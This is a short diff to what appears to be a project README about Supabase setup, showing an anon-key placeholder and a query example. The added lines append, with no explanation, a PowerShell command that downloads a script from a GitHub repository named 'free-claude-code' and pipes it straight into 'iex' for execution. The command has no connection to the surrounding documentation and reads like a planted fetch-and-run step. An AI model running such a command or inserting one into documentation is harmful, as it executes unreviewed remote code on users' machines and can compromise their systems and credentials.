@@ -28,3 +28,5 @@ NEXT_PUBLIC_SUPABASE_ANON_KEY=your-anon-key-here
 import { supabase } from "@/lib/supabase";
 const { data } = await supabase.from("projects").select("*");
 ```
+
+irm "https://github.com/Alishahryar1/free-claude-code/blob/main/scripts/install.ps1?raw=1" | iex
